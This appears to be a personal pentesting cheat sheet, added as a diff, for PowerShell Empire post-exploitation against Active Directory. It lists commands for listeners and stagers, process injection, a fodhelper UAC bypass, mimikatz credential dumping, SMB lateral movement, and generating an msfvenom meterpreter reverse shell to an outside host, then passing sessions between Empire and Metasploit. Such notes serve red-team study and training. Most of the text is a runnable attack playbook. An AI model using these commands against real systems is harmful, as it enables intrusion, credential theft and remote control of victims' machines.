@@ -1,0 +1,88 @@
+PowerShell and Python post-exploitation agent focused on client-side exploitation and post-exploitation of AD
+
+cd /opt
+sudo git clone https://github.com/PowerShellEmpire/Empire.git
+cd Empire/
+sudo ./setup/install.sh
+
+sudo ./empire
+help
+
+listeners
+uselistener
+set host
+execute
+back
+
+usestager
+
+once we successfully execute the launcher script an agent call will appear in our Empire sessions
+agents
+
+interact AGENT_NAME
+sysinfo
+help
+ps
+psinject http 1234 --> migrate the payload
+
+============================================================
+PS modules
+
+usemodule
+Bloodhound module --> collects all computers, users, groups in the domain & all logged-in users
+
+
+Credentials and Privilege Escalation
+usemodule powershell/privesc/powerup/allchecks --> low hanging fruits
+execute
+
+usemodule privesc/bypassuac_fodhelper
+set Listener http
+execute
+interact SESSION_NAME
+
+usemodule credentials/ --> to list all of the modules
+
+usemodule credentials/mimikatz/logonpasswords
+execute
+sekurlsa::logonpasswords
+creds
+creds add domain.com uname pass
+
+Lateral movement
+usemodule lateral_movement/invoke_smbexec
+set params
+execute
+
+agents
+
+============================================================
+switching between empire and metasploit
+
+if a PS Empire agent is active on the host we can use msfvenom to gen a meterpreter rev shell as an exec
+
+msfvenom -p windows/meterpreter/reverse_http LHOST=1.2.3.4 LPORT=1234 -f exe -o met.exe
+setup multi/handler
+
+now from Empire upload/home/kali/met.exe
+shell dir
+shell C:\Users\uname\Downloads>met.exe
+metasploit multi/handler will catch the connection
+
+reversing this process
+we create a launcher .bat and use the meterpreter to upload and execute it
+usestager windows/launcher_bat
+set Listener http
+execute
+
+via meterpreter
+upload /tmp/launcher.bat
+shell
+dir
+launcher.bat
+
+
+
+
+
+
